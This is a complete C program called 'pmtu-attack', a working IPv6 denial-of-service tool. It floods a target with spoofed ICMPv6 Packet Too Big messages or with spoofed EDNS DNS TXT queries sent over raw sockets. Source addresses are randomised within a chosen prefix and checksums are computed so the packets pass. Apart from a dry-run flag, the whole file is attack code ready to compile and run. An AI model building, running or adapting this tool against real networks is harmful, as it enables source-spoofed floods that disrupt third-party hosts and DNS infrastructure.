#include <stdio.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <assert.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <getopt.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/ip6.h>
#include <netinet/icmp6.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <time.h>

#include "rnd_well512.h"

#define ARGV0 "pmtu-attack"


struct {
	struct {
		int urnd; // kept open to seed the prng when required.
		int sck;
	} fd;
	struct {
		char str_addr[INET6_ADDRSTRLEN + sizeof("%4294967295") - 1];
	} dst;
	struct {
		struct timespec ts_last_report;
		size_t last_it_cnt;
	} bm;
	struct {
		rnd_well512_t well512;
	} rnd;
	struct {
		struct {
			uint8_t m[256];
			size_t len;
		} rname;
	} txt;
} gctx;

struct {
	struct {
		uint8_t addr[16];
		uint8_t mask[16];
		uint8_t len;
	} src_net;
	struct {
		const char *str;
		struct sockaddr_in6 sa;
	} dst;
	struct {
		bool dryrun;
		bool quiet;
		union {
			uint32_t help:1;
		};
	} flags;
	int v;
	const char *mode;
	const char *txt;
} param;

static void init_global (void) {
	gctx.fd.urnd = -1;
	gctx.fd.sck = -1;
}

static void free_global (void) {
	close(gctx.fd.urnd);
	close(gctx.fd.sck);
}

static bool alloc_globals (void) {
	gctx.fd.urnd = open("/dev/urandom", O_RDONLY);
	if (gctx.fd.urnd < 0) {
		fprintf(stderr, ARGV0": ");
		perror("/dev/urandom");
		return false;
	}

	if (!param.flags.dryrun) {
		gctx.fd.sck = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
		if (gctx.fd.sck < 0) {
			fprintf(stderr, ARGV0": ");
			perror("socket()");
			return false;
		}
	}

	clock_gettime(CLOCK_MONOTONIC, &gctx.bm.ts_last_report);

	return true;
}

static void seedrnd (void) {
	read(gctx.fd.urnd, gctx.rnd.well512.state, sizeof(gctx.rnd.well512.state));
}

static void genrnd (const size_t len, void *out) {
	rnd_well512(&gctx.rnd.well512, out, len);
}

static void print_help (FILE *f) {
	fprintf(f,
"Usage: %s [-hdq] [--help] [--dryrun] [--quiet] <-m MODE>|<--mode MODE>"
"       [-T TXT]|[--txt TXT] [--] SRC_NET DST_ADDR\n"
"MODE:        'ptb_flood_icmp6_echo' | 'txt_dns_flood'\n"
"SRC_NET:     2001:db8:1:2::/64\n"
"DST_ADDR:    any string accepted by getaddrinfo()\n"
"Options:\n"
"  -m, --mode MODE  run in specified mode\n"
"  -T, --txt TXT    TXT rname to use in query\n"
"  -d, --dryrun     run in dry mode (don't actually send anything)\n"
"  -v, --verbose    increase verbosity\n"
"  -q, --quiet      report errors only\n"
"  -h, --help       print this message and exit normally\n"
		,
		ARGV0);
};

static void lock_ouput (void) {}
static void unlock_ouput (void) {}

static void report_sent (const void *addr, const int err) {
	char str_addr[INET6_ADDRSTRLEN] = { 0, };

	inet_ntop(AF_INET6, addr, str_addr, sizeof(str_addr));

	lock_ouput(); {
		printf(
			"{ \"what\": \"sendto\", \"msg\": { \"pid\": %d, \"from\": \"%s\", \"to\": \"%s\", \"error\": %d } }\n"
			,
			(int)getpid(),
			str_addr,
			gctx.dst.str_addr,
			err
		);
	}
	unlock_ouput();
}

static uint16_t calc_chksum6 (
	const struct ip6_hdr *ih,
	const uint8_t *nh,
	size_t n_len,
	const uint8_t *data,
	size_t data_len)
{
	uint_fast32_t sum = 0;
	const uint_fast32_t tcp_length = (uint32_t)(n_len + data_len);
	const uint8_t *addr_src = (const uint8_t*)&ih->ip6_src;
	const uint8_t *addr_dst = (const uint8_t*)&ih->ip6_dst;

	sum += ((uint_fast16_t)addr_src[0] << 8) | addr_src[1];
	sum += ((uint_fast16_t)addr_src[2] << 8) | addr_src[3];
	sum += ((uint_fast16_t)addr_src[4] << 8) | addr_src[5];
	sum += ((uint_fast16_t)addr_src[6] << 8) | addr_src[7];
	sum += ((uint_fast16_t)addr_src[8] << 8) | addr_src[9];
	sum += ((uint_fast16_t)addr_src[10] << 8) | addr_src[11];
	sum += ((uint_fast16_t)addr_src[12] << 8) | addr_src[13];
	sum += ((uint_fast16_t)addr_src[14] << 8) | addr_src[15];

	sum += ((uint_fast16_t)addr_dst[0] << 8) | addr_dst[1];
	sum += ((uint_fast16_t)addr_dst[2] << 8) | addr_dst[3];
	sum += ((uint_fast16_t)addr_dst[4] << 8) | addr_dst[5];
	sum += ((uint_fast16_t)addr_dst[6] << 8) | addr_dst[7];
	sum += ((uint_fast16_t)addr_dst[8] << 8) | addr_dst[9];
	sum += ((uint_fast16_t)addr_dst[10] << 8) | addr_dst[11];
	sum += ((uint_fast16_t)addr_dst[12] << 8) | addr_dst[13];
	sum += ((uint_fast16_t)addr_dst[14] << 8) | addr_dst[15];

	sum += (uint16_t)((tcp_length & 0xFFFF0000) >> 16);
	sum += (uint16_t)(tcp_length & 0xFFFF);
	sum += ih->ip6_ctlun.ip6_un1.ip6_un1_nxt;

	// tcp header
	while (n_len > 1) {
		sum += ((uint_fast32_t)nh[0] << 8) + nh[1];
		nh += 2;
		n_len -= 2;
	}
	if (n_len > 0) {
		sum += nh[0];
	}

	// data
	while (data_len > 1) {
		sum += ((uint_fast32_t)data[0] << 8) + data[1];
		data += 2;
		data_len -= 2;
	}
	if (data_len > 0) {
		sum += data[0];
	}

	return ~((sum & 0xFFFF) + (sum >> 16));
}

static void genrnd_src_addr (void *out) {
	const size_t p_Blen = param.src_net.len / 8;
	uint8_t *o = (uint8_t*)out;
	uint8_t m;

	genrnd(16 - p_Blen, o + p_Blen);

	for (size_t i = 0; i < 16; i += 1) {
		m = param.src_net.mask[i];
		o[i] = (param.src_net.addr[i] & m) | (o[i] & ~m);
	}
}

static void ts_sub (
		struct timespec *out,
		const struct timespec *a,
		const struct timespec *b)
{
	if (a->tv_nsec < b->tv_nsec) {
		out->tv_sec = a->tv_sec - 1 - b->tv_sec;
		out->tv_nsec = 1000000000 + a->tv_nsec - b->tv_nsec;
	}
	else {
		out->tv_sec = a->tv_sec - b->tv_sec;
		out->tv_nsec = a->tv_nsec - b->tv_nsec;
	}
}

static void do_report_print (
		const size_t it_period,
		const struct timespec *ts_elapsed)
{
	lock_ouput(); {
		printf(
			"{ \"what\": \"throughput\", \"msg\": { \"pid\": %d, \"duration\": %ld.%03ld, \"count\": %zu } }\n"
			,
			(int)getpid(),
			(long)ts_elapsed->tv_sec,
			ts_elapsed->tv_nsec / 1000000,
			it_period
		);
	}
	unlock_ouput();
}

static void do_report (const size_t cur_it) {
	struct timespec ts_now, ts_elapsed;

	clock_gettime(CLOCK_MONOTONIC, &ts_now);
	ts_sub(&ts_elapsed, &ts_now, &gctx.bm.ts_last_report);

	if (ts_elapsed.tv_sec <= 0) {
		return;
	}

	do_report_print(cur_it - gctx.bm.last_it_cnt, &ts_elapsed);

	gctx.bm.ts_last_report = ts_now;
	gctx.bm.last_it_cnt = cur_it;
}

static void mount_attack_icmp6_ptb (void) {
	struct {
		struct ip6_hdr ih6;
		struct icmp6_hdr icmp6;
		struct {
			struct ip6_hdr ih6;
			struct icmp6_hdr icmp6;
		} body;
	} snd_buf = { 0, };
	ssize_t fr;

	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(sizeof(snd_buf) - sizeof(struct ip6_hdr));
	snd_buf.icmp6.icmp6_type = ICMP6_PACKET_TOO_BIG;
	snd_buf.icmp6.icmp6_dataun.icmp6_un_data32[0] = htonl(1280);

	snd_buf.body.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_ICMPV6;
	snd_buf.body.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(sizeof(struct icmp6_hdr));
	memcpy(&snd_buf.body.ih6.ip6_src, &snd_buf.ih6.ip6_dst, 16);
	snd_buf.body.icmp6.icmp6_type = ICMP6_ECHO_REPLY;
	genrnd(sizeof(uint32_t), snd_buf.body.icmp6.icmp6_dataun.icmp6_un_data8);

	for (size_t it = 0; ; it += 1) {
		genrnd_src_addr(&snd_buf.ih6.ip6_src);
		memcpy(&snd_buf.body.ih6.ip6_dst, &snd_buf.ih6.ip6_src, 16);

		snd_buf.body.icmp6.icmp6_cksum = 0;
		snd_buf.body.icmp6.icmp6_cksum = htons(calc_chksum6(
			&snd_buf.body.ih6,
			(const uint8_t*)&snd_buf.body.icmp6,
			sizeof(struct icmp6_hdr),
			NULL,
			0
		));

		snd_buf.icmp6.icmp6_cksum = 0;
		snd_buf.icmp6.icmp6_cksum = htons(calc_chksum6(
			&snd_buf.ih6,
			(const uint8_t*)&snd_buf.icmp6,
			sizeof(snd_buf) - sizeof(struct ip6_hdr),
			NULL,
			0
		));

		errno = 0;
		fr = param.flags.dryrun ? 0 : sendto(
			gctx.fd.sck,
			&snd_buf,
			sizeof(snd_buf),
			MSG_NOSIGNAL,
			(const struct sockaddr*)&param.dst.sa,
			sizeof(struct sockaddr_in6));

		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
			report_sent(&snd_buf.ih6.ip6_src, errno);
		}
		if (!param.flags.quiet) {
			do_report(it);
		}
	}
}

static int main_ptb_flood_icmp6_echo (void) {
	// TODO: parallelise?
	seedrnd();
	mount_attack_icmp6_ptb();
	return 0;
}

static void foreach_label (
		const char *in_rname,
		void *uc,
		bool(*cb)(char *label, uint8_t len, void *uc))
{
	char rname[256];
	char *p, *dot;
	uint8_t len;

	p = rname;
	strncpy(rname, in_rname, sizeof(rname) - 1);

	do {
		dot = strchr(p, '.');

		if (dot != NULL) {
			*dot = 0;
		}
		len = (uint8_t)strlen(p);
		if (len > 0) {
			if (!cb(p, len, uc)) {
				return;
			}
		}
		p = dot + 1;
	} while (dot != NULL);

	cb(NULL, 0, uc);
}

static bool label_rname (char *label, uint8_t len, void *) {
	assert(gctx.txt.rname.len + len < sizeof(gctx.txt.rname));

	gctx.txt.rname.m[gctx.txt.rname.len] = len;
	memcpy(gctx.txt.rname.m + 1 + gctx.txt.rname.len, label, len);
	gctx.txt.rname.len += (size_t)len + 1;

	return true;
}

void mount_attack_dns_txt_flood (void) {
	struct {
		struct ip6_hdr ih6;
		struct udphdr udp;
		uint8_t data[512];
	} snd_buf = { 0, };
	ssize_t fr;
	const uint16_t data_len = (uint16_t)gctx.txt.rname.len + 27;

	memcpy(&snd_buf.ih6.ip6_dst, &param.dst.sa.sin6_addr, 16);
	snd_buf.ih6.ip6_ctlun.ip6_un2_vfc = 6 << 4;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_hlim = 128;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_nxt = IPPROTO_UDP;
	snd_buf.ih6.ip6_ctlun.ip6_un1.ip6_un1_plen = htons(
		(uint16_t)sizeof(struct udphdr) +
		data_len
	);
	snd_buf.udp.uh_dport = param.dst.sa.sin6_port = htons(53);
	snd_buf.udp.uh_ulen = htons((uint16_t)sizeof(struct udphdr) + data_len);

	// QR: 0, Opcode: 0, AA:0, TC: 0, RD: 1, RA: 0, Z: 0, RCODE: 0
	snd_buf.data[2] = 0x01;
	snd_buf.data[3] = 0x00;
	// QDCOUNT: 1
	snd_buf.data[4] = 0x00;
	snd_buf.data[5] = 0x01;
	// ANCOUNT, NSCOUNT
	snd_buf.data[6] = snd_buf.data[7] = snd_buf.data[8] = snd_buf.data[9] = 0x00;
	// ARCOUNT: 1
	snd_buf.data[10] = 0x00;
	snd_buf.data[11] = 0x01;
	// QNAME
	memcpy(snd_buf.data + 12, gctx.txt.rname.m, gctx.txt.rname.len);
	// QTYPE: TXT
	snd_buf.data[gctx.txt.rname.len + 12] = 0x00;
	snd_buf.data[gctx.txt.rname.len + 13] = 0x10;
	// QCLASS: IN
	snd_buf.data[gctx.txt.rname.len + 14] = 0x00;
	snd_buf.data[gctx.txt.rname.len + 15] = 0x01;

	// NAME: ROOT
	snd_buf.data[gctx.txt.rname.len + 16] = 0x00;
	// OPT
	snd_buf.data[gctx.txt.rname.len + 17] = 0x00;
	snd_buf.data[gctx.txt.rname.len + 18] = 0x29;
	// UDP payload size: 1298
	snd_buf.data[gctx.txt.rname.len + 19] = 0x05;
	snd_buf.data[gctx.txt.rname.len + 20] = 0x12;

	snd_buf.data[gctx.txt.rname.len + 21] = 0x00;
	snd_buf.data[gctx.txt.rname.len + 22] = 0x00;

	snd_buf.data[gctx.txt.rname.len + 23] = 0x00;
	snd_buf.data[gctx.txt.rname.len + 24] = 0x00;
	// Data length: 0
	snd_buf.data[gctx.txt.rname.len + 25] = 0x00;
	snd_buf.data[gctx.txt.rname.len + 26] = 0x00;

	for (size_t it = 0; ; it += 1) {
		genrnd_src_addr(&snd_buf.ih6.ip6_src);

		// ID
		genrnd(2, snd_buf.data);
		snd_buf.data[1] |= 1; // as 0 is reserved

		genrnd(2, &snd_buf.udp.uh_sport);
		snd_buf.udp.uh_sport = htons((snd_buf.udp.uh_sport % 59975) + 1025);
		snd_buf.udp.uh_sum = 0;
		snd_buf.udp.uh_sum = htons(calc_chksum6(
			&snd_buf.ih6,
			(const uint8_t*)&snd_buf.udp,
			sizeof(snd_buf.udp),
			snd_buf.data,
			data_len
		));

		errno = 0;
		fr = param.flags.dryrun ? 0 : sendto(
			gctx.fd.sck,
			&snd_buf,
			sizeof(struct ip6_hdr) + sizeof(struct udphdr) + data_len,
			MSG_NOSIGNAL,
			(const struct sockaddr*)&param.dst.sa,
			sizeof(struct sockaddr_in6));

		if (fr < 0 || (!param.flags.quiet && param.v > 0)) {
			report_sent(&snd_buf.ih6.ip6_src, errno);
		}
		if (!param.flags.quiet) {
			do_report(it);
		}
	}
}

static void init_dns_txt_labels (void) {
	gctx.txt.rname.len = 0;
	foreach_label(param.txt, NULL, label_rname);
	assert(gctx.txt.rname.len < sizeof(gctx.txt.rname.m));
}

static int main_txt_dns_flood (void) {
	// TODO: parallelise?
	init_dns_txt_labels();

	seedrnd();

	mount_attack_dns_txt_flood();

	return 0;
}

static void fill_prefix (uint8_t len, uint8_t *out) {
	const size_t cnt_bytes = len / 8;
	size_t i;

	for (i = 0; i < cnt_bytes; i += 1) {
		out[i] = 0xff;
	}
	len -= cnt_bytes * 8;
	out += i;
	for (i = 0; i < len; i += 1) {
		*out = (*out << 1) | 1;
	}
}

static bool parse_net_str (
		const char *in_str,
		void *addr,
		void *mask,
		uint8_t *len)
{
	char str[INET6_ADDRSTRLEN];
	char *slash;
	uint8_t ret_buf[16];
	uint8_t ret_mask[16] = { 0, };
	uint8_t ret_len = 0;
	int fr;

	strncpy(str, in_str, sizeof(str) - 1);
	slash = strchr(str, '/');
	if (slash != NULL) {
		*slash = 0;

		if (sscanf(slash + 1, "%"SCNu8, &ret_len) != 1 || ret_len > 128) {
			errno = EINVAL;
			return false;
		}
	}
	else {
		ret_len = 128;
	}

	fr = inet_pton(AF_INET6, str, ret_buf);
	if (fr == 0) {
		errno = EINVAL;
		return false;
	}
	else if (fr < 0) {
		return false;
	}
	fill_prefix(ret_len, ret_mask);

	memcpy(addr, ret_buf, 16);
	memcpy(mask, ret_mask, 16);
	*len = ret_len;
	return true;
}

static bool parse_param (const int argc, const char **argv) {
	static const struct option LOPTS[] = {
		{ "help",    false, NULL, 'h' },
		{ "dryrun",  false, NULL, 'd' },
		{ "quiet",   false, NULL, 'q' },
		{ "mode",    true,  NULL, 'm' },
		{ "verbose", false, NULL, 'v' },
		{ "txt",     true,  NULL, 'T' },
	};
	int loi = -1;
	int fr;
	bool fallthrough = false;

	while (true) {
		fr = getopt_long(argc, (char *const*)argv, "hdqm:vT:", LOPTS, &loi);
		if (fr < 0) {
			break;
		}

		switch (fr) {
		case 'h': fallthrough = (param.flags.help = true); break;
		case 'd': param.flags.dryrun = true; break;
		case 'q': param.flags.quiet = true; break;
		case 'm': param.mode = optarg; break;
		case 'v': param.v += 1; break;
		case 'T': param.txt = optarg; break;
		default: return false;
		}
	}

	if (fallthrough) {
		return true;
	}

	if (param.mode == NULL) {
		fprintf(stderr, ARGV0": missing option -m\n");
		return false;
	}

	if (optind + 1 >= argc) {
		fprintf(stderr, ARGV0": too few arguments\n");
		return false;
	}

	fr = parse_net_str(
		argv[optind],
		param.src_net.addr,
		param.src_net.mask,
		&param.src_net.len
	);
	if (!fr) {
		fprintf(stderr, ARGV0": ");
		perror(argv[optind]);
		return false;
	}

	param.dst.str = argv[optind + 1];

	return true;
}

static bool resolve_dst (void) {
	static struct addrinfo hints = { 0, };
	int fr;
	struct addrinfo *ai = NULL;
	char addr_str[INET6_ADDRSTRLEN] = { 0, };

	hints.ai_family = AF_INET6;
	// hints.ai_socktype = SOCK_RAW;
	// hints.ai_protocol = IPPROTO_RAW;
	fr = getaddrinfo(param.dst.str, NULL, &hints, &ai);
	if (fr != 0) {
		return false;
	}

	// hostname resolve. copy the sa into our address space
	assert(sizeof(param.dst.sa) == ai->ai_addrlen);
	memcpy(&param.dst.sa, ai->ai_addr, sizeof(param.dst.sa));

	// cache the selected dst address string for reporting purposes
	inet_ntop(AF_INET6, &param.dst.sa.sin6_addr, addr_str, sizeof(addr_str));
	if (param.dst.sa.sin6_scope_id > 0) {
		snprintf(
			gctx.dst.str_addr,
			sizeof(gctx.dst.str_addr),
			"%s%%%"PRIu32
			,
			addr_str,
			param.dst.sa.sin6_scope_id
		);
	}
	else {
		strncpy(gctx.dst.str_addr, addr_str, sizeof(gctx.dst.str_addr) - 1);
	}

	freeaddrinfo(ai);
	return true;
}

int main (const int argc, const char **argv) {
	int ec = 0;

	init_global();

	if (!parse_param(argc, argv)) {
		ec = 2;
		goto END;
	}

	if (param.flags.help) {
		print_help(stdout);
		goto END;
	}

	if (!alloc_globals()) {
		ec = 1;
		goto END;
	}

	if (!resolve_dst()) {
		fprintf(stderr, ARGV0": ");
		perror(param.dst.str);
		ec = 1;
		goto END;
	}
	if (!param.flags.quiet) {
		fprintf(stderr, ARGV0": selected target: %s\n", gctx.dst.str_addr);
	}

	if (strcmp(param.mode, "ptb_flood_icmp6_echo") == 0) {
		ec = main_ptb_flood_icmp6_echo();
	}
	else if (strcmp(param.mode, "txt_dns_flood") == 0) {
		if (param.txt == NULL) {
			fprintf(stderr, ARGV0": missing option -T\n");
			ec = 2;
			goto END;
		}

		ec = main_txt_dns_flood();
	}
	else {
		fprintf(stderr, ARGV0": ");
		errno = EINVAL;
		perror(param.mode);
		ec = 2;
	}

END:
	free_global();
	return ec;
}
